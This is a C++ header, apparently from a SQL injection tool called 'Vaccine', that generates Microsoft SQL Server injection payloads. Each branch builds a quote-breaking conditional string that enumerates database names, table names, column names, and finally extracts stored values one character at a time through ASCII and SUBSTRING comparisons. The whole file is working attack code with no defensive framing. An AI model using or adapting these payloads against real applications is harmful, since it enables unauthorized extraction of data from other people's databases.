#ifndef MICROSOFTSQL_TIME_BASED
#define MICROSOFTSQL_TIME_BASED

#include "../../Vaccine.hpp"
#include "../mysql/mysql.hpp"

struct microsoftsql_time_based
{
        static std::string payload(sptr_vector& config, const uint8& type)
        {
                const int index = std::stoi(*config[TIME_BASED_INDEX]);
                switch (type)
                {
                case DATABASES:
                        return "' OR 1=CASE WHEN (ASCII(SUBSTRING(("
                               "SELECT TOP 1 name "
                               "FROM (SELECT TOP " +
                               std::to_string(index + 1) + " name " +
                               "FROM master..sysdatabases " +

                               "ORDER BY name ASC "
                               "EXCEPT SELECT TOP " +
                               *config[TIME_BASED_INDEX] + " name " +
                               "FROM master..sysdatabases " +

                               "ORDER BY name ASC) as sub), " +
                               *config[TIME_BASED_CMP_START] +
                               ", 1)) = ASCII('" +
                               *config[TIME_BASED_CMP] + "')) " +
                               "THEN 1 ELSE 0 END-- ";
                case TABLES:
                        return "' OR 1=CASE WHEN (ASCII(SUBSTRING(("
                               "SELECT TOP 1 TABLE_NAME "
                               "FROM (SELECT TOP " +
                               std::to_string(index + 1) + " TABLE_NAME " +
                               "FROM " + *config[TIME_BASED_DATABASE] +
                               ".INFORMATION_SCHEMA.TABLES " +

                               "ORDER BY TABLE_NAME ASC "
                               "EXCEPT SELECT TOP " +
                               *config[TIME_BASED_INDEX] + " TABLE_NAME " +
                               "FROM " + *config[TIME_BASED_DATABASE] +
                               ".INFORMATION_SCHEMA.TABLES " +

                               "ORDER BY TABLE_NAME ASC) as sub), " +
                               *config[TIME_BASED_CMP_START] +
                               ", 1)) = ASCII('" +
                               *config[TIME_BASED_CMP] + "')) " +
                               "THEN 1 ELSE 0 END-- ";
                case COLUMNS:
                        return "' OR 1=CASE WHEN (ASCII(SUBSTRING(("
                               "SELECT TOP 1 COLUMN_NAME "
                               "FROM (SELECT TOP " +
                               std::to_string(index + 1) + " COLUMN_NAME " +
                               "FROM " + *config[TIME_BASED_DATABASE] +
                               ".INFORMATION_SCHEMA.COLUMNS " +
                               "WHERE TABLE_NAME='" +
                               *config[TIME_BASED_TABLE] + "' " +

                               "ORDER BY COLUMN_NAME ASC "
                               "EXCEPT SELECT TOP " +
                               *config[TIME_BASED_INDEX] + " COLUMN_NAME " +
                               "FROM " + *config[TIME_BASED_DATABASE] +
                               ".INFORMATION_SCHEMA.COLUMNS " +
                               "WHERE TABLE_NAME='" +
                               *config[TIME_BASED_TABLE] + "' " +

                               "ORDER BY COLUMN_NAME ASC) as sub), " +
                               *config[TIME_BASED_CMP_START] +
                               ", 1)) = ASCII('" +
                               *config[TIME_BASED_CMP] + "')) " +
                               "THEN 1 ELSE 0 END-- ";
                case VALUES:
                        return "' OR 1=CASE WHEN (ASCII(SUBSTRING(("
                               "SELECT TOP 1 CAST(" +
                               *config[TIME_BASED_COLUMN] +
                               " AS varchar(255)) " +
                               "FROM (SELECT TOP " +
                               std::to_string(index + 1) + " " +
                               *config[TIME_BASED_COLUMN] + " " +
                               "FROM " + *config[TIME_BASED_DATABASE] + ".." +
                               *config[TIME_BASED_TABLE] + " " +

                               "ORDER BY " +
                               *config[TIME_BASED_COLUMN] + " ASC " +
                               "EXCEPT SELECT TOP " +
                               *config[TIME_BASED_INDEX] + " " +
                               *config[TIME_BASED_COLUMN] + " " +
                               "FROM " + *config[TIME_BASED_DATABASE] + ".." +
                               *config[TIME_BASED_TABLE] + " " +

                               "ORDER BY " +
                               *config[TIME_BASED_COLUMN] + " ASC) as sub), " +
                               *config[TIME_BASED_CMP_START] +
                               ", 1)) = ASCII('" +
                               *config[TIME_BASED_CMP] + "')) " +
                               "THEN 1 ELSE 0 END-- ";
                default:
                        return std::string();
                }
        };
};
#endif
